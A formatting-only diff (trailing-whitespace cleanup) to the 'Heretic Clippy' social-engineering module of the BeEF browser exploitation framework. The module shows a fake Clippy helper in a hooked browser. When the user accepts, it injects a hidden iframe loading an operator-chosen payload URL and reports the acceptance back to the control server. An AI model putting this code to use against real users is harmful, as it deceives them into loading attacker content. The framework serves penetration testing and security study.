@@ -5,7 +5,7 @@
 //
 
 beef.execute(function() {
-  
+
 /**
  * Heretic Clippy
  * @version 1.0.0
@@ -52,7 +52,7 @@ HelpText.prototype.toString = function() {
 	return this.question;
 }
 HelpText.prototype.toString = function() {
-	return this.getKey();	
+	return this.getKey();
 }
 HelpText.prototype.toElements = function() {
 
@@ -124,7 +124,7 @@ ClippyDisplay.prototype.fadeIn = function(duration,options) {
 
 	var _clipple = this;
 
-	if (!options) 
+	if (!options)
 		options = {};
 	if (!options.step)
 		options.step = 1 / 200;
@@ -137,7 +137,7 @@ ClippyDisplay.prototype.fadeIn = function(duration,options) {
 
 	options.remain--;
 	options.value += options.step;
-	
+
 	if (navigator.userAgent.match(/MSIE/)) {
 		imgfile = _clipple.file_dir + "clippy-main.png";
 		_clipple.div.filters[0].Apply();
@@ -157,7 +157,7 @@ ClippyDisplay.prototype.fadeOut = function(duration,options) {
 
 	var _clipple = this;
 
-	if (!options) 
+	if (!options)
 		options = {};
 	if (!options.step)
 		options.step = 1 / 200;
@@ -171,17 +171,17 @@ ClippyDisplay.prototype.fadeOut = function(duration,options) {
 	options.remain--;
 	options.value -= options.step;
 	_clipple.div.style.opacity = options.value;
-	
+
 
 
 	if (navigator.userAgent.match(/MSIE/)) {
 		document.body.removeChild(document.getElementById("pipes"));
 	}
 	else {
-		if (options.remain > 0) { 
-			setTimeout(function(){_clipple.fadeOut(duration,options);}, options.increment); 
-		}	
-		else{ 
+		if (options.remain > 0) {
+			setTimeout(function(){_clipple.fadeOut(duration,options);}, options.increment);
+		}
+		else{
 			document.body.removeChild(document.getElementById("pipes"));
 		}
 	}
@@ -268,7 +268,7 @@ Clippy.prototype.findHomeBase = function(selector) {
 		selector = "body";
 
 	var ref = false;
-	
+
 	if (selector.charAt(0)=="#") {
 		ref = document.getElementById(selector);
 	} else {
@@ -284,15 +284,15 @@ Clippy.prototype.findHomeBase = function(selector) {
 		div.style.position = "fixed";
 		div.style.bottom = "0";
 		div.style.right = "0";
-		
+
 		ref.appendChild(div);
 
 		return div;
-	
+
 	}
-	
+
 	beef.debug(ref);
-	
+
 	return ref;
 }
 Clippy.prototype.run = function(opt) {
@@ -321,16 +321,16 @@ Clippy.prototype.killClippy = function(){
 		this.character.fadeOut(1000);
 }
 Clippy.prototype.hahaha = function() {
-	
+
 		var div = document.createElement("div");
 		var _c = this;
 		div.id = "heehee";
 		div.style.display = "none";
 		div.innerHTML="<iframe src='<%== @executeyes %>' width=1 height=1 style='display:none'></iframe>";
-		
+
 		document.body.appendChild(div);
 		_c.openBubble("<%== @thankyoumessage %>");
-		setTimeout(function () { _c.killClippy(); }, 5000); 
+		setTimeout(function () { _c.killClippy(); }, 5000);
 		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer=user has accepted');
 
 }
@@ -344,7 +344,7 @@ Clippy.prototype.addHelp = function(_help, is_startphrase) {
 Clippy.prototype.sayOne = function(keys,alternative) {
 
 	var found = false, count = 0;
-	
+
 	while(count < keys.length) {
 		var choice = parseInt( Math.random() * keys.length );
 		if( this.canSay( keys[choice]) ) {
@@ -374,10 +374,10 @@ Clippy.prototype.say = function(key,alternative) {
 	this.openBubble( this.help[ key ].toElements() );
 }
 Clippy.prototype.firstLine = function() {
-	this.sayOne(this.firstlines);	
+	this.sayOne(this.firstlines);
 }
 Clippy.prototype.talkLater = function() {
-	this.closeBubble(); 
+	this.closeBubble();
 	var _c = this;
 	this.timer = setTimeout( function() { _c.firstLine(); }, 2000);
 }
